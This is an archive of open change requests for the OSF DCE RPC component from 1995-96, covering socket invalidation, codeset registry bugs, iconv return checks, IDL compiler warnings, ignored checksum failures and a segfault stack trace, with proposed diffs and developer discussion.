Found Date                    : 2/21/96
Severity                      : C
Priority                      : 0
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : rpc/runtime/cnrcvr.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[2/21/96 public]

==============================================================================
Diffing Delta aswini-17317-rpc-runtime-cn-invalidate-closed-sock-fd 1.1
==============================================================================
File: rpc/runtime/cnrcvr.c
*** 12.7        1995/12/20 17:53:04
--- 12.10       1996/01/31 16:18:11
***************
*** 2,7 ****
--- 2,15 ----
   * @TRANSARC_COPYRIGHT@
   *
   * $TALog: cnrcvr.c,v $
+  * Revision 12.10  1996/01/31  16:18:11  aswini
+  * Invalidate the closed socket in the association. Hence close the
+  * the window in which the receiver closes the socket and the RPC thread uses 
the
+  * the closed socket desciptor, which may not belong to it any more.
+  *
+  * See above.
+  * [from r12.7 by delta aswini-17317-rpc-runtime-cn-invalidate-closed-sock-fd,
 r1.1]
+  *
***************
*** 528,533 ****
--- 536,542 ----
                  }
                  
                  assoc->cn_ctlblk.cn_state = RPC_C_CN_CLOSED;
+                 assoc->cn_ctlblk.cn_sock = -1;
                  
                  /*
                   * Remove any pending cancel on this assoc. Otherwise, it's

[10/10/96 public]

Fixed in 1.1 maintenance.



CR Number                     : 13322
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : doc
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : app_gd
Short Description             : idl chapter should describe use of #include
Reported Date                 : 2/16/96
Found in Baseline             : 1.1
Found Date                    : 2/16/96
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : src/dce_books/app_gd/rpc/idl.gpsml
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 7511
Transarc Status               : open

[2/16/96 public]
The use of the "include" statement is described in the ACF chapter
(chapter 18) of the App Dev Guide-Core, but should also be mentioned
in the IDL chapter.
The IDL chapter (chapter 17) describes the "import" statement used to
import a file with the RPC IDL utility.  However, the "import"
statement reads in only "const," "typedef," and "import" statements
from the imported file.  To read in a whole file, byte by byte (as the
C preprocessor does), you can use the "include" statement in your .idl
file (where the included file contains valid IDL code).
Added field Transarc Deltas with value `7511' 
Added field Transarc Status with value `open'



CR Number                     : 13288
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : rpc_rgy_get_codesets() return wrong info for current codeset
Reported Date                 : 1/23/96
Found in Baseline             : 1.1
Found Date                    : 1/23/96
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[1/23/96 public]

When the current locale's code set is the last one in
the code set registry data base, which is sorted by the code set
values, the code set informations such as max_bytes were not copied
correctly to the code sets array returned by rpc_rgy_codesets().

Following is the diff in cs_s_reg.c for fixing this bug:

921c921
< 	int		i,k;
---
> 	int		i;
965,967c965
< 	for (i = 1, k = 1;
< 	     (i < rpc_g_codesets_effective_count) || (k == rpc_g_codesets_effective_count);
< 	     i++)
---
> 	for (i = 1; i < rpc_g_codesets_effective_count; i++)


This OT defect corresponds to IBM cmvc 18320.


I left out k++; in the fix.



CR Number                     : 13287
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Code set registry data can not be reread
Reported Date                 : 1/23/96
Found in Baseline             : 1.1
Found Date                    : 1/23/96
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[1/23/96 public]


rpc_codesets_really_read_file() is the internal routine to read the code set registry
data into memory.  It uses a local global flag: rpc_g_codesets_did_read
to determine whether the code set registry data has been read.  This
flag is set to TRUE when code set registry is first accessed so 
that the data is read only once to avoid the overhead.  This flag
was not initialized, therefore, even the code set registry data file was changed,
the new file did not get opened.

The variable "rpc_g_codesets_did_read" needs be initialized to 0.
Following is the diff in cs_s_reg.c for this defect.

69c69
< static boolean		rpc_g_codesets_did_read = FALSE;  /* CMVC 18144 */
---
> static boolean		rpc_g_codesets_did_read;

This defect corresponds to IBM cmvc 18144.

[01/24/96 public]
According to the definition ofthe C language, uninitialized data is
defined to be zero.  So the two statements are equivalent.  Perhaps
there is a bug in your C compiler?  This defect can be cancelled.



CR Number                     : 13285
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Unitialized variable in cs_s_stub.c
Reported Date                 : 1/22/96
Found in Baseline             : 1.1
Found Date                    : 1/22/96
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[1/23/96 public]
Variable "tags_p" is not initialized in all instances within the
function "rpc_cs_get_tags" prior to it being utilized.



CR Number                     : 13284
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 13170
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Incorrect rtn stat check in cs_s_conv.c
Reported Date                 : 1/22/96
Found in Baseline             : 1.1
Found Date                    : 1/22/96
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[1/23/96 public]
This defect is in the same general code area within cs_s_conv.c 
as OT13170.

The return status check from the iconv() call is incorrect, based on
the XPG/4 specification.  According to XPG/4, if the call to iconv()
fails, as -1 will be returned and errno will be set.  In addition,
a successful conversion mandates that inbytesleft is set to zero; a
non-zero value indicates that iconv() was unable to convert the 
entire contents of the buffer.  Both of these return values should
checked upon return from iconv().

Also, as a point of code-cleanliness, inbytesleft and outbytesleft
should be defined as size_t's.

Here is a diff of the changes within cs_s_conv.c, including those
modifications noted for OT13170:

-----[94-95 changed to 94-95]-----
<       int                     inbytesleft;
<       int                     outbytesleft;
---
>       size_t                  inbytesleft;
>       size_t                  outbytesleft;
-----[135 changed to 135-140]-----
<       if (i_ret)      /* Iconv returns zero when it succeed */
---
>       /* Check return value and inbytesleft for any possible iconv errors
>        * per XPG/4 (CHFts17316) and fix conditional statements logic
>        * errors (OT13170 / CHFts17320).
>        */
>
>       if ((i_ret == -1) || (inbytesleft != 0))
-----[139 changed to 144]-----
<               else if (errno = E2BIG)
---
>               else if (errno == E2BIG)
-----[141 changed to 146]-----
<               else if (errno = EINVAL)
---
>               else if (errno == EINVAL)

[1/22/96 public]
Changed component from sec to rpc...clicked on the wrong WWW template
button when submitting OT.



CR Number                     : 13283
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : rpc
Subcomponent Name             : idl
Short Description             : don't generate volatile casts
Reported Date                 : 1/19/96
Found in Baseline             : 1.1
Found Date                    : 1/19/96
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[1/19/96 public]

idl generates lines like the following in at least _sstub.c's

  IDL_ms.IDL_call_h = (volatile rpc_call_handle_t)IDL_call_h;

The c89 compiler generates warnings for each instance:

c89 +w1 -g -I../include -I../idl -I. -D_HPUX_SOURCE  -D_NEED_ACL_LIB   -c wandmgmt_sstub.c -o wandmgmt_sstub.o
cc: "wandmgmt_sstub.c", line 925: warning 568: When casting to a qualified type, the qualifier is ignored.
cc: "wandmgmt_sstub.c", line 1093: warning 568: When casting to a qualified type, the qualifier is ignored.
cc: "wandmgmt_sstub.c", line 1263: warning 568: When casting to a qualified type, the qualifier is ignored.
cc: "wandmgmt_sstub.c", line 1433: warning 568: When casting to a qualified type, the qualifier is ignored.
cc: "wandmgmt_sstub.c", line 1602: warning 568: When casting to a qualified type, the qualifier is ignored.
cc: "wandmgmt_sstub.c", line 1771: warning 568: When casting to a qualified type, the qualifier is ignored.
cc: "wandmgmt_sstub.c", line 1944: warning 568: When casting to a qualified type, the qualifier is ignored.
cc: "wandmgmt_sstub.c", line 2116: warning 568: When casting to a qualified type, the qualifier is ignored.
cc: "wandmgmt_sstub.c", line 2286: warning 568: When casting to a qualified type, the qualifier is ignored.
cc: "wandmgmt_sstub.c", line 2457: warning 568: When casting to a qualified type, the qualifier is ignored.
cc: "wandmgmt_sstub.c", line 2628: warning 568: When casting to a qualified type, the qualifier is ignored.
cc: "wandmgmt_sstub.c", line 2795: warning 568: When casting to a qualified type, the qualifier is ignored.

Change the cast to remove the "volatile" qualifier.



CR Number                     : 13280
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : rpc
Subcomponent Name             : uuidgen
Short Description             : include UL suffix on uuidgen -s
Reported Date                 : 1/15/96
Found in Baseline             : 1.1
Found Date                    : 1/15/96
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[1/15/96 public]

$ uuidgen -s
= { /* 138db29a-4fa6-11cf-bced-080009251352 */
    0x138db29a, 0x4fa6, 0x11cf, 0xbc, 0xed,
    { 0x08, 0x00, 0x09, 0x25, 0x13, 0x52 }
};

The first value (0x138db29a above) should have a UL suffix to stop the
compiler warnings from c89 on HP/UX:

cc: "dce-acl.c", line 12: warning 700: ANSI migration: large unsuffixed integer constants will not be of type long in ANSI mode.



CR Number                     : 13225
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : AES compliant VTS servers
Reported Date                 : 12/16/95
Found in Baseline             : 1.1
Found Date                    : 12/16/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[12/16/95 public]

The following issue has come up regarding AES compliant
VTS servers. I realize that this is a RPC VTS related issue
but I hope to target a wider audience through an rpc related ot.

A support customer has filed 4 VTS tickets with the syseng group.
I am not familiar with the RPC Validation Test Suite or
the AES. I am hoping someone can help me determine an
appropriate response.

It appears that the customer's NT server exhibits different
behavior than the VTS server in certain areas. As a result,
some of the VTS tests are not valid for servers exhibiting
such behavior.

The customer requests that the tests be modified to work with 
their NT implementation. 

The descriptions of how their servers work (4 scenarios)
versus how the DCE VTS test servers work follow this mail. 

I would like to know:

Does the behavior of their NT server conform to the AES?

   If yes, what would be an appropriate course of action? 
	(ie: open a VTS ot against the tests in question)

   If no, then would the appropriate response be,
   " the NT servers are not AES compliant, therefore, some of 
   the VTS tests are not valid for servers exhibiting this 
   behavior". No ot's filed, no VTS changes required.


Much thanks in advance....

	-Anna
	axg@osf.org

---------------------------------------------

Offering and Version: VTS version 1.0.2
Component (Module):   Connection-less server protocol tests
Client Hardware:      DEC  RISC
Client Software:      Ultrix V4.2 (Rev 96)
Server Hardware:      Intel Pentium
Server Software:      Windows NT
Compiler:


-------------------
One Line Description:

    Test lserver 123.


Full Description:

    This test assumes server will send a fault PDU (protocol error)
    if second call is made on same sequence number and activity id.

    NT server drops such packets (assuming that they have been
    resent by a router) and does not send a fault.

    Test is not valid for above implementation.


---------------------
One Line Description:

    Test lserver 128.


Full Description:

    The second call is made on the same activity id as the first call
    (first call fails in the server manager routine due to Divide by Zero
    error).

    VTS expects the server to make a callback for the second call also.
    NT server does not do that since the callback to the first call was
    successful and second call is made on same activity id.


    Test should be changed for such behavior OR second call should be made
    on a different activity id.

    Other tests that need to change include 129, 130, 131, 132, 136, 137,138,
    139, 141-146.


---------------------
One Line Description:

    Test lserver 156.


Full Description:

    VTS sends request as follows - seq0, frag0 , then sends seq1, frag1,
    and then sends seq0, frag1.

    On getting seq1, frag1, NT server assumes that client is restarting
    call with new sequence number, and hence ignores all following sequence 0
    packets as stale packets.

    Test is not valid for servers of above behavior.


-------------------
One Line Description:

    Test lserver 8.


Full Description:

    VTS sends the first fragment in the request as non-idempotent, and the
    rest of the fragments as idempotent.

    NT server assumes that call is non-idempotent, whereas VTS assumes that
    it is idempotent.

    Test should be modified - all fragments should be sent consistently
    - as idempotent/non-idempotent.

[4/19/96 public]

Since I have not checked AES or VTS, the following comment is just
informational.

1) Test lserver 123

Because of the unreliable nature of DG, there is no way to reliably test
the server's behavior unless you hook into the server's runtime. For
instance, a fault pdu maybe lost over the network, or OS networking code
may decide not to send it.

2) Test lserver 128

VTS should not expect the way callback, if the connection is way-validated.

3) Test lserver 156

The NT server seems to be doing the right thing. What's VTS expecting?

4) Test lserver 8

What's VTS testing with invalid pdus?



CR Number                     : 13211
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : RPC checksum errors not handled
Reported Date                 : 11/27/95
Found in Baseline             : 1.0.3, 1.1
Found Date                    : 11/22/95
Severity                      : A
Priority                      : 0
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[11/27/95 public]
Abstract: RPC recv_dispatch() does not handle checksum failures

Description:
We have encountered a very serious problem in the CN RPC runtime code,
regarding the processing of request data when using packet integrity
checking.  The basic problem is that if a data packet gets corrupted on
the wire, the checksum on the server side fails (as it should), but
simply does an fprintf() to stderr, and keeps on going!  This is clearly
manager routine, as if nothing happened.

We have a simple client/server testcase using pipes, that uses packet
integrity, and it clearly demonstrates the problem.

We can reproduce this problem by setting a breakpoint in the client RPC
runtime, and corrupting the data packet AFTER the checksum has been done.
We use an idl pipe, transfering a file from the client to the server, and
sure enough, the fprintf() statement is printed out, and the output file
will contain the corruption that we introduced.

The offending code is in cnrcvr.c, in the routine recv_dispatch().  Here is
where the problem lies:

...
...
              else
              {
atus = %x\n", auth_st);
                  if (packet_info_table[ptype].class == ASSOC_CLASS_PKT)
                  {
                      break;
                  }
              }
...
...

This is an else clause within the error handling path after the checksum has
failed.  You can see that if the packet class was association, then the
break statement causes the for loop in the receive_dispatch() routine to
be exited, and this in turn causes a FAULT PDU to be sent back to the
client.  However, when the packet is not an association class packet, the
packet is just passed on thru, and the fact that the checksum failed is
effectively ignored, except for the printf statement that might or might
no be seen on someones console.  Even so, there is no way to tell where
the checksum failure happened.

We have changed our code to eliminate the if statement, and will always do
a break if the checksum returned in error.  This has the effect of causing
the server to return an error of rpc_s_comm_failure to the client, when a
packet that is not an association class packet fails the checksum.  Not much
information, but at least it keeps the corrupted data from going unnoticed.

We are not sure if this is the proper solution though.  Somebody specifically
put in code to check for association class packets, hopefully for a reason.
When the checksum error is detected, and the packet is an association class
packet, the client gets an rpc_s_unknown_reject error.  So there are different
recovery mechanisms in place for different points in the server RPC state
machine.  Is there a better/cleaner way to handle a shutdown of an RPC when
the checksum error is detected during packet transmission?


Can you please indicate exactly where "in the client RPC"
you are "corrupting the data packet"?

>This has the effect of causing the server to return an error
>of rpc_s_comm_failure to the client packet that is not an
>association class packet fails the checksum.

It will also effectively shutdown the call, correct?  I believe
this this is what should happen in the case of a regular RPC.
In the case where we are transporting a pipe though; where
security level, packet_integrity is being requested is this
really what we want to happen here?  I think that there
is probably no other alternative except, 1). reject the packet
2) send a com failure to the client. 3. shutdown the pipe.

If you really need to guarantee this packet_integ security
you must at least drop the packet.  In the case of a pipe,
being used to transfer a file, this you don't have much
choice; this means dropping the rest of the file and
restarting the transfer.

Bob

[12/06/95 public]
You need to set a breakpoint in the client RPC runtime in the routine
rpc__cn_assoc_send_frag().  The breakpoint must be just before the
RPC_SOCKET_SENDMSG() call, after the requested authentication level
has been applied.  I have been setting the breakpoint on the while loop
that surrounds the RPC_SOCKET_SENDMSG() call.

I have been enabling the RPC DEBUG statements, and tracking rpc_e_dbg_cn_pkt,
levels 1 and 20.  Since I was using a pipe to transmit a large file, I would
let it go for a while, until I was sure it was in the process of transmitting
to file.  Then I offset into the iovector, and corrupt a few bytes out in
the middle of the data packet.  We were sending a file that consisted of
all character '\n's, so when we corrupted the packet (by overwriting a space
character over some of the '\n's, it became very easy to detect in the
destination file, after it was written out to disk.

[12/8/95 public]

The auth3 pdu which is not used by the current protocol is the only packet
caught by the above "if (packet_info_table[ptype].class ==
ASSOC_CLASS_PKT)" statement. Thus, "break" is noop. Try adding the
following "else if {...}", probably it will give you a little better
status. (No guarantee, though. I havn't tried it by myself.)

        /*
         * Finally, post the event to the appropriate state machine
         */
        if (packet_info_table[ptype].class == CALL_CLASS_PKT)
        {
            if ((ptype == RPC_C_CN_PKT_REQUEST) 
                && 
                (RPC_CN_PKT_FLAGS (pktp) & RPC_C_CN_FLAGS_FIRST_FRAG))
            {
		:
		:
            }
            else if (auth_st != rpc_s_ok)
            {
                assert(assoc->assoc_flags & RPC_C_CN_ASSOC_SERVER);
                RPC_CN_SEND_FAULT (call_r, auth_st);
                fragbuf_p = NULL;
                continue;
            }
            else
            {
                RPC_CN_POST_CALL_SM_EVENT (assoc, 
                                           packet_info_table[ptype].event, 
                                           fragbuf_p,
                                           st);
            }

[01/18/96 public]
I have implemented the code provided by Seitchi, and it does not appear to
be having any effect.  The code is being run (I ran it under the debugger,
and set a breakpoint in the server RPC runtime), but the fault pdu does not
cause the data transmission to stop.  I have not been able to do extensive
analysis of exactly what the fault pdu's effect is on the data transmission,
but a cursory look at the output data file from my file xfer testcase (using
pipes) shows that the data file was not written to after the fault pdu was
sent.  Maybe the RPC runtime was just draining the pipe?  But no error was
detected on the client side.  More investigation is necessary.

I have not had the bandwidth recently to look at the problem more.  If someone
would like my testcase, and detailed instructions on what I am doing, I can
provide that.  I have documented what I did to reproduce the problem in this
OT, above.

[02/01/96 public]

Assigned to Digital to address in the 1.2.2 timeframe.



CR Number                     : 13193
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : rpc
Subcomponent Name             : idl
Short Description             : lex problems with nidl.l on
recent versions of HPUX
Reported Date                 : 11/9/95
Found in Baseline             : 1.1
Found Date                    : 11/9/95
Severity                      : A
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1maint
Fixed In Baseline             : 1.1maint
Affected File(s)              : rpc/idl/idl_compiler/nidl.l
Sensitivity                   : public

[11/9/95 public]

There are mismatches between the prototype for yyoutput and yyunput that is
in nidl.l and the prototypes that the boilerplate ncform has in recent
versions of HPUX. There was a similar problem on AIX a couple of years ago.
The solution was to #ifdef out the nidl.l prototypes in the case of AIX and
let the boilerplate ones stand. I propose the same solution here but maybe
the old prototypes should be excised altogether - is there any platform on
which they are still needed?

In any case, here is the diff:

198,199c195,196
< #ifndef _AIX
< #if defined(SNI_SVR4)
---
> #if !defined(_AIX) && !defined(HPUX)
> #if defined(SNI_SVR4)



CR Number                     : 13189
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 5325
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : rpc__tower_ref_alloc SIGSEGV
Reported Date                 : 11/7/95
Found in Baseline             : 1.1
Found Date                    : 11/7/95
Severity                      : C
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[11/7/95 public]

I believe that the following problem described by ac@hal.com
MAY be a duplicate of a CR 5325 which was closed because it 
could not be duplicated. Consistently reproducible test cases
could not be documented in this case either,however, this does
look like a lingering memory leak.

From ac@hal.com Fri May 26 10:28:48 1995
 
[ text deleted ]

I would like to submit the description to you and hopefully you can shed
some lights on this problem before I open a bug report.

Our DCE1.1 went rather smoothly until QA folks applies stress testing
(combination of OSF system test cases) on the software.  Over a few hours=
 of
testing (ranges from 2 to 8 hours), some client application like cdsclerk=
,
rgy_edit, dce_login ... etc would core dump within the routine
rpc__tower_ref_alloc() which tries to perform memcpy().

It appears to us that the real cause of the problem may due to the LARGE
number of floors (num_flrs) to go through and some of those contains
garbage information which leads to the out-of-data-space address for memc=
py()
to operate with.  In the following stack trace, we see that the num_flrs
is passed with value of 49923 which is way too high when comparing to a
normal operation (I dbx a normal operation and almost all returns 5)

We suspect the data passed back from cdsd is corrupted because the
tower_octet_string contains the num_flrs information.

Does OSF or other vendor see this problem before?  If cdsd is having trou=
ble
coordinating access to its database information, what or where would you
recommend me to start looking at the cdsd code?

If you need further information, please do let me know so I can provide
additional material to you.  Thanks in advanced for your help!

Adrian Chan
ac@halsoft.com

- -----------------------stack trace of one instance-------------------

(dbx) where                                                              =
    =

=3D>[1] rpc__tower_ref_alloc(tower_octet_string =3D 0x8e4b4 "^C=C3^D ^D}^=
D=DA^A^H", num_flrs =3D 49923, start_flr =3D 1, tower_ref =3D 0xeead10fc,=
 status =3D 0xeead1f68), line 314 in "/extern_sd2/newsb/obj/sparc-solaris=
/rpc/runtime/../../../../src/rpc/runtime/comtwrref.c"
  [2] rpc__tower_to_tower_ref(tower =3D 0x8e4b0, tower_ref =3D 0xeead10fc=
, status =3D 0xeead1f68), line 343 in "/build/dce/dce/obj/sparc-solaris/r=
pc/runtime/../../../../src/rpc/runtime/comtwr.c"
  [3] rpc__bindlkup_node_get_bindings(lookup_context =3D 0x282080, bindin=
g_vector =3D 0x2d7bd0, status =3D 0xeead1f68), line 2473 in "/build/dce/d=
ce/obj/sparc-solaris/rpc/runtime/../../../../src/rpc/runtime/nslookup.c"
  [4] rpc__bindlkup_node_process(lookup_context =3D 0x282080, lookup_node=
 =3D 0xe6b08, binding_vector =3D 0x2d7bd0, status =3D 0xeead1f68), line 1=
051 in "/build/dce/dce/obj/sparc-solaris/rpc/runtime/../../../../src/rpc/=
runtime/nslookup.c"
  [5] rpc_ns_binding_lookup_next(lookup_context =3D 0x282080, binding_vec=
tor =3D 0x280fc4, status =3D 0xeead1f68), line 646 in "/build/dce/dce/obj=
/sparc-solaris/rpc/runtime/../../../../src/rpc/runtime/nslookup.c"
  [6] rpc_ns_binding_import_next(import_context =3D 0x280fc0, binding =3D=
 0x1db724, status =3D 0xeead1f68), line 370 in "/build/dce/dce/obj/sparc-=
solaris/rpc/runtime/../../../../src/rpc/runtime/nsbndimp.c"
  [7] rca_site_bind_nsi_cell_if(context =3D 0x1db718, cell_name =3D 0x2ec=
ad0 "/.../starseed_cell.dce.hal.com", if_spec =3D 0xef7600b8, status =3D =
0xeead1f68), line 1722 in "/build/dce/dce/obj/sparc-solaris/security/util=
s/../../../../src/security/client/rca/internal_binding.c"
  [8] rca_site_bind_nsi_cell(context =3D 0x1db718, cell_name =3D 0x2ecad0=
 "/.../starseed_cell.dce.hal.com", status =3D 0xeead1f68), line 1761 in "=
/build/dce/dce/obj/sparc-solaris/security/utils/../../../../src/security/=
client/rca/internal_binding.c"
  [9] rca_nsi_binding_import(context =3D 0x1db718, status =3D 0xeead1f68)=
, line 1115 in "/build/dce/dce/obj/sparc-solaris/security/utils/../../../=
=2E./src/security/client/rca/internal_binding.c"
  [10] rca_site_bind(site_name =3D 0xeead1a37 "/.../starseed_cell.dce.hal=
=2Ecom", auth_info =3D 0xeead2b74, flags =3D 3, if_spec =3D (nil), princ =
=3D 0xef76b658 "dce-rgy", cell =3D (nil), context =3D 0xeead2b70, status =
=3D 0xeead1f68), line 2293 in "/build/dce/dce/obj/sparc-solaris/security/=
utils/../../../../src/security/client/rca/internal_binding.c"
  [11] sec_rgy_site_bind(site_name =3D 0xeead1f6d "", auth_info =3D 0xeea=
d2b74, context =3D 0xeead2b70, status =3D 0xeead1f68), line 163 in "/buil=
d/dce/dce/obj/sparc-solaris/security/utils/../../../../src/security/clien=
t/rca/binding.c"
  [12] sec_rgy_site_bind_query(site_name =3D 0xeead1f6d "", auth_info =3D=
 0xeead2b74, context =3D 0xeead2b70, status =3D 0xeead1f68), line 228 in =
"/build/dce/dce/obj/sparc-solaris/security/utils/../../../../src/security=
/client/rca/binding.c"
  [13] sec_krb_sec_parse_name(context =3D 0x2f5808, level =3D 5, name =3D=
 0x18a820 "/.../starseed_cell.dce.hal.com/hosts/starseed/cds-server", par=
sed_name =3D 0x2f11a0), line 416 in "/build/dce/dce/obj/sparc-solaris/sec=
urity/utils/../../../../src/security/utils/sec_authn.c"
  [14] rpc__krb_bnd_set_auth(server_name =3D 0x18a820 "/.../starseed_cell=
=2Edce.hal.com/hosts/starseed/cds-server", level =3D 5, auth_ident =3D 0x=
2f5808, authz_prot =3D 2, binding_h =3D 0x190468, infop =3D 0xeead2c70, s=
tp =3D 0xeead3628), line 268 in "/build/dce/dce/obj/sparc-solaris/rpc/run=
time/../../../../src/rpc/runtime/krbclt.c"
  [15] rpc_binding_set_auth_info(binding_h =3D 0x190468, server_princ_nam=
e =3D 0x18a820 "/.../starseed_cell.dce.hal.com/hosts/starseed/cds-server"=
, authn_level =3D 5, authn_protocol =3D 1, auth_identity =3D 0x2f5808, au=
thz_protocol =3D 2, st =3D 0xeead3628), line 926 in "/build/dce/dce/obj/s=
parc-solaris/rpc/runtime/../../../../src/rpc/runtime/comauth.c"
  [16] get_secure_handle(0x7dc, 0x7ec, 0x670, 0xeead3628, 0x668, 0x7a400)=
, at 0x25484
  [17] get_rpc_handle(0x19e4, 0xef756228, 0x764, 0xeead404c, 0x0, 0x0), a=
t 0x24ed4
  [18] ReadAttributeRPC(0xaa4, 0x13fa54, 0x2, 0x16c9a025, 0x0, 0x0), at 0=
x300e4
  [19] processAddr(0x123a35, 0x13fa54, 0x123a35, 0x123a35, 0x13fa54, 0x10=
d0a3f5), at 0x1fed4
  [20] processCH(0x50c, 0x0, 0x2f, 0x2f, 0xeead49a5, 0x10d0a3ec), at 0x1f=
5c4
  [21] clerk_WalkTree(0xffffefb4, 0xffffefcc, 0xffffefcc, 0x182c18, 0x2, =
0x2), at 0x1eef0
  [22] sendToWalkTree(0xef756228, 0x4e4, 0x13fa54, 0x8, 0xeead62e5, 0xeea=
d22e7), at 0x2090c
  [23] clerkReadAttribute(0x1974, 0x308f8, 0x13fa54, 0xb08, 0x30c18, 0x13=
fa54), at 0x31968
  [24] clerk_request(0x30c, 0x13fa54, 0x19e4, 0xef756228, 0x338, 0x7a288)=
, at 0x1abbc
(dbx)


-------------------------------
From: ac@hal.com (Adrian Chan)
Date: Thu, 26 Oct 1995 10:17:11 -0500 (CDT)

[ text deleted]  We still seeing it from time to time, and
with the different combination of test runs; we kind of closing to a
conclusion of memory management related issue.

We have other problems which can be attributed to lack of swap space, disk
space etc.  I try to give Parul some more predictive information and we
have not come up anything conclusive.

Unless other people are seeing similar symtoms, I do not have additional
information right now.  If we do, I'll definitely send you an update.



CR Number                     : 13188
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : memory leak in cs_s_reg.c
Reported Date                 : 11/6/95
Found in Baseline             : 1.1
Found Date                    : 11/6/95
Severity                      : D
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[11/6/95 public]

The cs_s_reg.c module includes a memory leak when reading the 
Code Set Registry into memory.  Specifically, the problem is in
the rpc__codesets_read_registry_file() routine, where the sort
logic should only be executed once. Instead, it currently is
being executed for each and every RPC call to dce_cs_rgy_to_loc()
and dce_cs_loc_to_rgy().



CR Number                     : 13170
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : coding error in rpc cs_s_conv.c
Reported Date                 : 10/27/95
Found in Baseline             : 1.1
Found Date                    : 10/27/95
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/27/95 public]

Attached is IBM's internal defect:


prefix        p
name          17980
reference     
abstract      coding error in rpc cs_s_conv.cd
duplicate     

state         open                        priority                          
severity      3                           target                            
age           4

compName      rpc.runtime.src             answer                            
release       os2dce21                    symptom       other               
envName                                   phaseFound    code                
level                                     phaseInject                       

addDate       95/10/23 17:54:05           assignDate    95/10/23 17:59:37   
lastUpdate    95/10/23 17:59:37           responseDate                      
endDate                                

ownerLogin    cwang                       originLogin   cwang               
ownerName     Cathy Wang                  originName    Cathy Wang          
ownerArea     lwqs                        originArea    lwqs                

tracks: none.

verify: none.

history:
    addDate              action          userLogin (userName)
    -------------------- --------------- ----------------------------------
